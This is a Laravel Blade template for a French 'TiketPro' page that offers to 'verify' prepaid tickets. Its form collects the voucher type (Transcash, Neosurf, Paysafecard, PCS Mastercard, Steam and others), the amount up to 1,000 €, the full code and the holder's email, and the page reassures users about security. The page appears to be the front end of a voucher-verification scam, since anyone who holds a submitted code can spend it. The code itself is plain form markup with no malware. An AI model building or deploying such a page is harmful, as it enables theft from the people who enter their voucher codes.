@extends('layouts.app')

@section('title', __('verify.title') . ' — TiketPro')

@section('content')

    <section class="section" style="padding-top: 32px; padding-bottom: 0;">
        <div class="page-head">
            <h1>{{ __('verify.title') }}</h1>
            <p>{{ __('verify.intro') }}</p>
        </div>
    </section>

    <section class="section">
        <div class="purchase-card purchase-card-narrow">
            @if (session('envoye'))
                <div class="verify-result verify-result-ok">
                    <strong>{{ __('verify.success_title') }}</strong>
                    {{ __('verify.success_text') }}
                </div>
            @endif

            <form class="verify-form" method="POST" action="{{ route('verifier.soumettre') }}" novalidate>
                @csrf

                <div class="form-group">
                   <label for="evenement">
    {{ __('verify.evenement') }}
    <span class="required-mark">*</span>
</label>
                    <div class="custom-suggestion">
                       <input
    type="text"
    id="evenement"
    name="evenement"
    placeholder="{{ __('verify.evenement_placeholder') }}"
    autocomplete="off"
    required
>
                        <button type="button" class="suggestion-toggle" aria-label="Afficher les types de ticket">▾</button>
                        <div class="suggestion-list" hidden>
                            <button type="button">Transcash</button>
                            <button type="button">Neosurf</button>
                            <button type="button">Steam</button>
                            <button type="button">Paysafecard</button>
                            <button type="button">Apple Card</button>
                            <button type="button">Google Pay</button>
                            <button type="button">PCS Mastercard</button>
                        </div>
                    </div>
                    <span class="field-hint">Choisissez un type ou saisissez-en un autre.</span>
                </div>

               
<div class="form-group">
   <label for="montant">
    {{ __('verify.montant') }}
    <span class="required-mark">*</span>
</label>

    <div class="custom-suggestion">
       <input
    type="text"
    id="montant"
    name="montant"
    placeholder="{{ __('verify.montant_placeholder') }}"
    inputmode="decimal"
    autocomplete="off"
    required
>
       
<button
    type="button"
    class="suggestion-toggle"
    aria-label="{{ __('verify.montant_suggestions') }}"
>
    ▾
</button>

<span class="field-hint">
    {{ __('verify.montant_hint') }}
</span>
        <div class="suggestion-list" hidden>
            <button type="button">10 €</button>
            <button type="button">20 €</button>
            <button type="button">50 €</button>
            <button type="button">100 €</button>
            <button type="button">150 €</button>
            <button type="button">200 €</button>
            <button type="button">250 €</button>
            <button type="button">500 €</button>
            <button type="button">1 000 €</button>
        </div>
    </div>
</div>


              <div class="form-group">
    <label for="code">
        {{ __('verify.ticket_code') }}
        <span class="required-mark">*</span>
    </label>

    <input
        type="text"
        id="code"
        name="code"
        placeholder="{{ __('verify.ticket_placeholder') }}"
        autocomplete="off"
        required
    >

    <span class="field-hint">
        {{ __('verify.ticket_hint') }}
    </span>
</div>

                <div class="form-group form-group-inline">
                   <label for="recevoir_email">
    {{ __('verify.masquer_code') }}
</label>
                   <select id="recevoir_email" name="recevoir_email">
    <option value="non">{{ __('verify.non') }}</option>
    <option value="oui">{{ __('verify.oui') }}</option>
</select>
                </div>

                <div class="form-group">
    <label for="email">
        {{ __('verify.email_titulaire') }}
        <span class="required-mark">*</span>
    </label>

    <input
        type="email"
        id="email"
        name="email"
        placeholder="{{ __('verify.email_placeholder') }}"
        autocomplete="off"
        required
    >

    <span class="field-hint">
        {{ __('verify.email_hint') }}
    </span>
</div>

              <button type="submit" class="btn btn-primary btn-full">
    {{ __('verify.verify_ticket') }}
</button>
</form>

<div class="purchase-trust">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
        <rect x="5" y="11" width="14" height="9" rx="2"/>
        <path d="M8 11V7a4 4 0 018 0v4"/>
    </svg>
    {{ __('verify.ticket_security') }}
</div>
        </div>
    </section>

    <section class="section" style="padding-bottom: 48px;">
        <div class="section-head">
            <h2>{{ __('verify.why_title') }}</h2>
        </div>

        <div class="features-icons">
            <div class="feature-icon-card">
                <div class="feature-icon feature-icon-amber">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 9v4"/><path d="M12 17h.01"/><path d="M10.3 3.9L2.8 17a2 2 0 001.7 3h15a2 2 0 001.7-3L13.7 3.9a2 2 0 00-3.4 0z"/></svg>
                </div>
                <h3>{{ __('verify.features.detection_title') }}</h3>
                <p>{{ __('verify.features.detection_text') }}</p>
            </div>
            <div class="feature-icon-card">
                <div class="feature-icon feature-icon-teal">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3.5 2"/></svg>
                </div>
                <h3>{{ __('verify.features.instant_title') }}</h3>
                <p>{{ __('verify.features.instant_text') }}</p>
            </div>
            <div class="feature-icon-card">
                <div class="feature-icon feature-icon-amber">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="11" width="14" height="9" rx="2"/><path d="M8 11V7a4 4 0 018 0v4"/></svg>
                </div>
                <h3>{{ __('verify.features.protection_title') }}</h3>
                <p>{{ __('verify.features.protection_text') }}</p>
            </div>
            <div class="feature-icon-card">
                <div class="feature-icon feature-icon-teal">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M8.5 12.3l2.2 2.2 4.3-4.6"/></svg>
                </div>
                <h3>{{ __('verify.features.reliability_title') }}</h3>
                <p>{{ __('verify.features.reliability_text') }}</p>
            </div>
        </div>
    </section>


<script>
document.addEventListener('DOMContentLoaded', function () {
    document.querySelectorAll('.verify-form .custom-suggestion').forEach(function (container) {
        var input = container.querySelector('input');
        var toggle = container.querySelector('.suggestion-toggle');
        var list = container.querySelector('.suggestion-list');

        toggle.addEventListener('click', function () {
            var opening = list.hidden;
            document.querySelectorAll('.verify-form .suggestion-list').forEach(function (other) {
                other.hidden = true;
            });
            list.hidden = !opening;
        });

        list.querySelectorAll('button').forEach(function (option) {
            option.addEventListener('click', function () {
                input.value = option.textContent.trim();
                input.dispatchEvent(new Event('input', { bubbles: true }));
                list.hidden = true;
            });
        });

        input.addEventListener('focus', function () {
            document.querySelectorAll('.verify-form .suggestion-list').forEach(function (other) {
                if (other !== list) other.hidden = true;
            });
        });

        document.addEventListener('click', function (event) {
            if (!container.contains(event.target)) list.hidden = true;
        });
    });
});
</script>


@endsection
